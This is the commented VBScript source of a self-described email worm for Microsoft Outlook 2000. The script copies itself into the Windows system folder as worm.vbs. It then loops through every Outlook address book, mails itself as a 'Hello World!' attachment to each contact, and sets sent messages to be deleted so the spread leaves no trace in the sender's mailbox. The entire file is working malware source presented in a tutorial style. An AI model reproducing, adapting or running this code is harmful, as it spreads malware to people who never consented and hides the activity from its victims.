'Simple Email-Worm using MAPI from Microsoft Outlook.
'Made in Visual Basic Script.
'It works in Microsoft Outlook 2000
'---------------------------------------------------------
On Error Resume Next 'If some error appears, it will ignore
Dim fso, dirnt, dirsys, shell 'Variables list
Set fso = CreateObject("Scripting.FileSystemObject") 'It creates a "FileSystemObject" Script in "fso" variable.
Set dirsys = fso.GetSpecialFolder(1) 'Get The System folder Path.
Set c = fso.GetFile(WScript.ScriptFullName) 'Get our worm file

c.copy(dirsys& "\worm.vbs") 'Copy it self to the System Folder path with the name "worm.vbs"

Set outlook = CreateObject("Outlook.Application") 'Identify the Outlook Application
If outlook = "Outlook" Then 'if "outlook" variable = "Outlook" Then:
    Set mapiObj = outlook.GetNameSpace("MAPI") 'takes the MAPI namespace that is responsible for outlook contacts.
    Set addrList = mapiObj.AddressLists 'set "addrList" as an outlook contact list
    For Each addr In addrList 'for each contact in the Address Book
        If addr.AddressEntries.Count <> 0 Then
        addrEntCount = addr.AddressEntries.Count
        For addrEntIndex = 1 To addrEntCount
            Set item = outlook.CreateItem(0) 'Give  permission to be able to create an item in Outlook
            Set addrEnt = addr.AddressEntries(addrEntIndex) 'Set the addrEnt to send to everyone in the Outlook Address Book.
                item.To = addrEnt.Address 'send items to contacts
                item.Subject = "Hello World!" 'Draft Header
                item.Body = "Hello" & vbcrlf & "World" 'Draft Body
                Set anexos = item.attachMents 'Give permission to "anexos", to be able to create attachments
                anexos.Add(dirsys& "\worm.vbs") 'It adds the attachment from the system folder wich is "worm.vbs"
                item.DeleteAfterSubmit = True 'When the draft is submitted, the variable "item" will be deleted
                If item.to <> "" Then 'If the item is "" then:
                    item.Send 'Send
                End If 'Ends the previous If
             Next
        End If 'Ends the previous If
     Next
End If 'Ends the previous If